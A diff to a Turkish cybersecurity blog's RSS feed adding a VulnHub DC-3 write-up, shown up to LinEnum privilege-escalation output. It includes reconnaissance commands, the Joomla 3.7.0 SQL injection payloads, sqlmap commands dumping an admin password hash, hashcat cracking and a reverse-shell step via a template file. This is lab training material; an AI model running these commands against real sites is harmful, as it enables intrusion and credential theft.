@@ -5,8 +5,454 @@
         <description>Recent content in Posts on Cyber Security Blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>tr</language>
-        <lastBuildDate>Mon, 28 Sep 2020 14:55:50 +0300</lastBuildDate>
+        <lastBuildDate>Tue, 29 Sep 2020 13:06:24 +0300</lastBuildDate>
         <atom:link href="https://barcode91.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>VULNHUB DC-3 Write Up</title>
+            <link>https://barcode91.github.io/posts/2020/09/vulnhub-dc-3-write-up/</link>
+            <pubDate>Tue, 29 Sep 2020 13:06:24 +0300</pubDate>
+            
+            <guid>https://barcode91.github.io/posts/2020/09/vulnhub-dc-3-write-up/</guid>
+            <description>Merhaba, Bu yazımda sizlere VULNHUB &amp;lsquo;da yer alan DC-3 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&amp;hellip; 😊
+1. Keşif Aşaması Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.
+netdiscover -i eth1  Nmap ile tüm portlar ve açık olan portlarda çalışan servisler tespit edilir.
+sudo nmap -sV -sC -p- 192.168.56.111  80 portunda çalışan web servisine tarayıcından istek atılır.</description>
+            <content type="html"><![CDATA[<p>Merhaba, Bu yazımda sizlere <a href="https://www.vulnhub.com/entry/dc-32,312/">VULNHUB</a> &lsquo;da yer alan DC-3 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&hellip; 😊</p>
+<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
+<p>Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth1
+</code></pre></div>
+    <img src="/images/vulnhub/dc3/netdiscover.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Nmap ile tüm portlar ve açık olan portlarda çalışan servisler tespit edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -p- 192.168.56.111
+</code></pre></div>
+    <img src="/images/vulnhub/dc3/nmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>80 portunda çalışan web servisine tarayıcından istek atılır. Sayfa kaynak kodu incelendiğinde Joomla CMS uygulamasının çalıştığı görülmektedir.</p>
+
+    <img src="/images/vulnhub/dc3/web.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Web dizin taraması gerçekleştirilir. Ayrıca google&rsquo;da arama yapıldığında <em><strong>administrator/manifests/files/joomla.xml</strong></em> içerisnde uygulama sürümü hakkında bilgi yer aldığı tespit edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://192.168.56.111 -w /usr/share/wordlists/dirb/big.txt
+</code></pre></div><pre><code class="language-terminal" data-lang="terminal">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://192.168.56.111
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/09/28 13:46:56 Starting gobuster
+===============================================================
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/administrator (Status: 301)
+/bin (Status: 301)
+/cache (Status: 301)
+/cli (Status: 301)
+/components (Status: 301)
+/images (Status: 301)
+/includes (Status: 301)
+/language (Status: 301)
+/layouts (Status: 301)
+/libraries (Status: 301)
+/media (Status: 301)
+/modules (Status: 301)
+/plugins (Status: 301)
+/server-status (Status: 403)
+/templates (Status: 301)
+/tmp (Status: 301)
+===============================================================
+2020/09/28 13:47:00 Finished
+===============================================================
+</code></pre><p>Web dizin taramasında joomla uygulamasının standart dosyaları dışında bir dosya tespit edilememektedir.</p>
+<p>http://192.168.56.111/administrator/manifests/files/joomla.xml adresine istek atılırak sürüm bilgisi tespit edilir. Sürümün 3.7.0 olduğu görülmektedir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+<span style="color:#f92672">&lt;extension</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;3.6&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;file&#34;</span> <span style="color:#a6e22e">method=</span><span style="color:#e6db74">&#34;upgrade&#34;</span><span style="color:#f92672">&gt;</span>
+	<span style="color:#f92672">&lt;name&gt;</span>files_joomla<span style="color:#f92672">&lt;/name&gt;</span>
+	<span style="color:#f92672">&lt;author&gt;</span>Joomla! Project<span style="color:#f92672">&lt;/author&gt;</span>
+	<span style="color:#f92672">&lt;authorEmail&gt;</span>admin@joomla.org<span style="color:#f92672">&lt;/authorEmail&gt;</span>
+	<span style="color:#f92672">&lt;authorUrl&gt;</span>www.joomla.org<span style="color:#f92672">&lt;/authorUrl&gt;</span>
+	<span style="color:#f92672">&lt;copyright&gt;</span>(C) 2005 - 2017 Open Source Matters. All rights reserved<span style="color:#f92672">&lt;/copyright&gt;</span>
+	<span style="color:#f92672">&lt;license&gt;</span>GNU General Public License version 2 or later; see LICENSE.txt<span style="color:#f92672">&lt;/license&gt;</span>
+	<span style="color:#f92672">&lt;version&gt;</span>3.7.0<span style="color:#f92672">&lt;/version&gt;</span>
+	<span style="color:#f92672">&lt;creationDate&gt;</span>April 2017<span style="color:#f92672">&lt;/creationDate&gt;</span>
+	<span style="color:#f92672">&lt;description&gt;</span>FILES_JOOMLA_XML_DESCRIPTION<span style="color:#f92672">&lt;/description&gt;</span>
+
+	<span style="color:#f92672">&lt;scriptfile&gt;</span>administrator/components/com_admin/script.php<span style="color:#f92672">&lt;/scriptfile&gt;</span>
+
+....
+</code></pre></div><p>Joomla sürümünün güncel olmadığı görülmektedir. Searchsploit ile exploit araması yapılır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">searchsploit joomla 3.7
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
+---------------------------------------------- ---------------------------------
+ Exploit Title                                |  Path
+---------------------------------------------- ---------------------------------
+Joomla! 3.7 - SQL Injection                   | php/remote/44227.php
+Joomla! 3.7.0 - <span style="color:#e6db74">&#39;com_fields&#39;</span> SQL Injection    | php/webapps/42033.txt
+Joomla! Component ARI Quiz 3.7.4 - SQL Inject | php/webapps/46769.txt
+Joomla! Component com_realestatemanager 3.7 - | php/webapps/38445.txt
+Joomla! Component Easydiscuss &lt; 4.0.21 - Cros | php/webapps/43488.txt
+Joomla! Component J2Store &lt; 3.3.7 - SQL Injec | php/webapps/46467.txt
+Joomla! Component JomEstate PRO 3.7 - <span style="color:#e6db74">&#39;id&#39;</span> SQ | php/webapps/44117.txt
+Joomla! Component Jtag Members Directory 5.3. | php/webapps/43913.txt
+Joomla! Component Quiz Deluxe 3.7.4 - SQL Inj | php/webapps/42589.txt
+---------------------------------------------- ---------------------------------
+</code></pre></div><p>İkinci sırada yer alan exploit -m parametresi ile indirilip incelenir. Uygulamada SqlInjection zafiyeti oluğu görülmektedir. Sqlmap aracı kullanılarak zafiyet sömürülür.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Exploit Title: Joomla 3.7.0 - Sql Injection
+# Date: 05-19-2017
+# Exploit Author: Mateus Lino
+# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
+# Vendor Homepage: https://www.joomla.org/
+# Version: = 3.7.0
+# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
+# CVE : - CVE-2017-8917
+
+
+URL Vulnerable: http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27
+
+
+Using Sqlmap: 
+
+sqlmap -u &#34;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+
+
+Parameter: list[fullordering] (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (DUAL)
+    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)
+
+    Type: error-based
+    Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)
+    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)
+    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)
+</code></pre></div><p>İlk olarak veritabanları tespit edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://192.168.56.111/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --random-agent --dbs -p list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span>
+</code></pre></div>
+    <img src="/images/vulnhub/dc3/sqlmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Tespit edilen joomla veritabanı seçilerek, veritabanında yer alan tablolar tespit edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://192.168.56.111/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --random-agent -D joomladb --tables -p list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Database: joomladb
+[76 tables]
++---------------------+
+| #__assets           |
+| #__associations     |
+| #__banner_clients   |
+| #__banner_tracks    |
+| #__banners          |
+| #__bsms_admin       |
+| #__bsms_books       |
+| #__bsms_comments    |
+| #__bsms_locations   |
+| #__bsms_mediafiles  |
+| #__bsms_message_typ |
+| #__bsms_podcast     |
+| #__bsms_series      |
+| #__bsms_servers     |
+| #__bsms_studies     |
+| #__bsms_studytopics |
+| #__bsms_teachers    |
+| #__bsms_templatecod |
+| #__bsms_templates   |
+| #__bsms_timeset     |
+| #__bsms_topics      |
+| #__bsms_update      |
+| #__categories       |
+| #__contact_details  |
+| #__content_frontpag |
+| #__content_rating   |
+| #__content_types    |
+| #__content          |
+| #__contentitem_tag_ |
+| #__core_log_searche |
+| #__extensions       |
+| #__fields_categorie |
+| #__fields_groups    |
+| #__fields_values    |
+| #__fields           |
+| #__finder_filters   |
+| #__finder_links_ter |
+| #__finder_links     |
+| #__finder_taxonomy_ |
+| #__finder_taxonomy  |
+| #__finder_terms_com |
+| #__finder_terms     |
+| #__finder_tokens_ag |
+| #__finder_tokens    |
+| #__finder_types     |
+| #__jbsbackup_timese |
+| #__jbspodcast_times |
+| #__languages        |
+| #__menu_types       |
+| #__menu             |
+| #__messages_cfg     |
+| #__messages         |
+| #__modules_menu     |
+| #__modules          |
+| #__newsfeeds        |
+| #__overrider        |
+| #__postinstall_mess |
+| #__redirect_links   |
+| #__schemas          |
+| #__session          |
+| #__tags             |
+| #__template_styles  |
+| #__ucm_base         |
+| #__ucm_content      |
+| #__ucm_history      |
+| #__update_sites_ext |
+| #__update_sites     |
+| #__updates          |
+| #__user_keys        |
+| #__user_notes       |
+| #__user_profiles    |
+| #__user_usergroup_m |
+| #__usergroups       |
+| #__users            |
+| #__utf8_conversion  |
+| #__viewlevels       |
++---------------------+
+</code></pre></div><p>Joomla veritabanında yer alan <em><strong>#__users</strong></em> tablosunda yer alan kolonlar tespit edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://192.168.56.111/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --random-agent -D joomladb -T <span style="color:#e6db74">&#39;#__users&#39;</span> --columns -p list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Database: joomladb
+Table: #__users
+[6 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| id       | numeric     |
+| name     | non-numeric |
+| password | non-numeric |
+| email    | non-numeric |
+| params   | non-numeric |
+| username | non-numeric |
++----------+-------------+
+</code></pre></div><p>Tablodaki username,password ve email sutunlarında yer alan bilgiler dump edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://192.168.56.111/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --random-agent -D joomladb -T <span style="color:#e6db74">&#39;#__users&#39;</span> -C username,password,email --dump -p list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Database: joomladb
+Table: #__users
+[1 entry]
++----------+--------------------------------------------------------------+--------------------------+
+| username | password                                                     | email                    |
++----------+--------------------------------------------------------------+--------------------------+
+| admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu | freddy@norealaddress.net |
++----------+--------------------------------------------------------------+--------------------------+
+</code></pre></div><p>Admin kullanıcısına ait hash bilgisi elde edilmektedir. Elde edilen hash bilgisi hashcat aracı ile sözlük saldırısı yapılarak kırılır. Elde edilen hash türü tespit edilir.</p>
+
+    <img src="/images/vulnhub/dc3/hashcatt.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat -m <span style="color:#ae81ff">3200</span> --force hash.txt /usr/share/wordlists/rockyou.txt 
+</code></pre></div>
+    <img src="/images/vulnhub/dc3/hashcat.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
+<p>Admin kullancısı ile sisteme giriş yapılır. Daha sonra template içerisinde yer alan protostar temasındaki error.php dosyası reverse shell alacak şekilde düzenlenir.</p>
+
+    <img src="/images/vulnhub/dc3/login.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p><em>http://192.168.56.111/template/protostar/error.php</em> adresine istek atılarak ncat ile dinlenen porta bağlantı sağlanılır.</p>
+<p>
+    <img src="/images/vulnhub/dc3/shell.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+Python pty modulü kullanılarak etkileşimli kabuğa geçilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</code></pre></div><h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
+<p>Yetki yükseltmek için LinEnum betiği kullanılırak sistem hakkında bilgi toplanır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#########################################################</span>
+<span style="color:#75715e"># Local Linux Enumeration &amp; Privilege Escalation Script #</span>
+<span style="color:#75715e">#########################################################</span>
+<span style="color:#75715e"># www.rebootuser.com</span>
+<span style="color:#75715e"># version 0.982</span>
+
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Debug Info
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Thorough tests <span style="color:#f92672">=</span> Disabled
+
+
+Scan started at:
+Tue Sep <span style="color:#ae81ff">29</span> 08:00:57 AEST <span style="color:#ae81ff">2020</span>
+
+
+<span style="color:#75715e">### SYSTEM ##############################################</span>
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kernel information:
+Linux DC-3 4.4.0-21-generic <span style="color:#75715e">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</span>
+
+
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kernel information <span style="color:#f92672">(</span>continued<span style="color:#f92672">)</span>:
+Linux version 4.4.0-21-generic <span style="color:#f92672">(</span>buildd@lgw01-06<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>gcc version 5.3.1 <span style="color:#ae81ff">20160413</span> <span style="color:#f92672">(</span>Ubuntu 5.3.1-14ubuntu2<span style="color:#f92672">)</span> <span style="color:#f92672">)</span> <span style="color:#75715e">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016</span>
+
+
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Specific release information:
+DISTRIB_ID<span style="color:#f92672">=</span>Ubuntu
+DISTRIB_RELEASE<span style="color:#f92672">=</span>16.04
+DISTRIB_CODENAME<span style="color:#f92672">=</span>xenial
+DISTRIB_DESCRIPTION<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Ubuntu 16.04 LTS&#34;</span>
+NAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Ubuntu&#34;</span>
+VERSION<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;16.04 LTS (Xenial Xerus)&#34;</span>
+ID<span style="color:#f92672">=</span>ubuntu
+ID_LIKE<span style="color:#f92672">=</span>debian
+PRETTY_NAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Ubuntu 16.04 LTS&#34;</span>
+VERSION_ID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;16.04&#34;</span>
+HOME_URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.ubuntu.com/&#34;</span>
+SUPPORT_URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://help.ubuntu.com/&#34;</span>
+BUG_REPORT_URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://bugs.launchpad.net/ubuntu/&#34;</span>
+UBUNTU_CODENAME<span style="color:#f92672">=</span>xenial
+
+<span style="color:#75715e">### USER/GROUP ##########################################</span>
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Current user/group info:
+uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+
+
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> It looks like we have some admin users:
+uid<span style="color:#f92672">=</span>104<span style="color:#f92672">(</span>syslog<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>108<span style="color:#f92672">(</span>syslog<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>108<span style="color:#f92672">(</span>syslog<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>
+uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dc3<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dc3<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dc3<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,110<span style="color:#f92672">(</span>lxd<span style="color:#f92672">)</span>,117<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,118<span style="color:#f92672">(</span>sambashare<span style="color:#f92672">)</span>
+
+
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Contents of /etc/passwd:
+root❌0:0:root:/root:/bin/bash
+daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin❌2:2:bin:/bin:/usr/sbin/nologin
+sys❌3:3:sys:/dev:/usr/sbin/nologin
+sync❌4:65534:sync:/bin:/bin/sync
+games❌5:60:games:/usr/games:/usr/sbin/nologin
+man❌6:12:man:/var/cache/man:/usr/sbin/nologin
+lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail❌8:8:mail:/var/mail:/usr/sbin/nologin
+news❌9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy❌13:13:proxy:/bin:/usr/sbin/nologin
+www-data❌33:33:www-data:/var/www:/usr/sbin/nologin
+backup❌34:34:backup:/var/backups:/usr/sbin/nologin
+list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats❌41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync❌100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network❌101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve❌102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy❌103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog❌104:108::/home/syslog:/bin/false
+_apt❌105:65534::/nonexistent:/bin/false
+lxd❌106:65534::/var/lib/lxd/:/bin/false
+mysql❌107:111:MySQL Server,,,:/nonexistent:/bin/false
+messagebus❌108:112::/var/run/dbus:/bin/false
+uuidd❌109:113::/run/uuidd:/bin/false
+dnsmasq❌110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+sshd❌111:65534::/var/run/sshd:/usr/sbin/nologin
+dc3❌1000:1000:dc3,,,:/home/dc3:/bin/bash
+
+<span style="color:#75715e">### ENVIRONMENTAL #######################################</span>
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Environment information:
+APACHE_PID_FILE<span style="color:#f92672">=</span>/var/run/apache2/apache2.pid
+APACHE_RUN_USER<span style="color:#f92672">=</span>www-data
+PATH<span style="color:#f92672">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+APACHE_LOG_DIR<span style="color:#f92672">=</span>/var/log/apache2
+PWD<span style="color:#f92672">=</span>/tmp
+LANG<span style="color:#f92672">=</span>C
+APACHE_RUN_GROUP<span style="color:#f92672">=</span>www-data
+SHLVL<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>
+APACHE_RUN_DIR<span style="color:#f92672">=</span>/var/run/apache2
+APACHE_LOCK_DIR<span style="color:#f92672">=</span>/var/lock/apache2
+_<span style="color:#f92672">=</span>/usr/bin/env
+
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Can we read/write sensitive files:
+-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1614</span> Apr <span style="color:#ae81ff">25</span> 16:27 /etc/passwd
+-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">806</span> Apr <span style="color:#ae81ff">25</span> 16:26 /etc/group
+-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">575</span> Oct <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2015</span> /etc/profile
+-rw-r----- <span style="color:#ae81ff">1</span> root shadow <span style="color:#ae81ff">968</span> Apr <span style="color:#ae81ff">25</span> 16:27 /etc/shadow
+
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> SUID files:
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">43316</span> May  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2014</span> /bin/ping6
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">157424</span> Mar <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2019</span> /bin/ntfs-3g
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">26492</span> Apr <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2016</span> /bin/umount
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">38900</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /bin/su
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">30112</span> Jul <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2016</span> /bin/fusermount
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">34812</span> Apr <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2016</span> /bin/mount
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">38932</span> May  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2014</span> /bin/ping
+-rwsr-sr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">105004</span> Mar <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2019</span> /usr/lib/snapd/snap-confine
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">13960</span> Jan <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2019</span> /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">38300</span> Mar  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2017</span> /usr/lib/i386-linux-gnu/lxc/lxc-user-nic
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">513528</span> Mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2019</span> /usr/lib/openssh/ssh-keysign
+-rwsr-xr-- <span style="color:#ae81ff">1</span> root messagebus <span style="color:#ae81ff">46436</span> Oct <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2016</span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">5480</span> Mar <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2017</span> /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">53128</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/passwd
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">36288</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/newgidmap
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">78012</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2017</span> /usr/bin/gpasswd
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">159852</span> May <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2017</span> /usr/bin/sudo
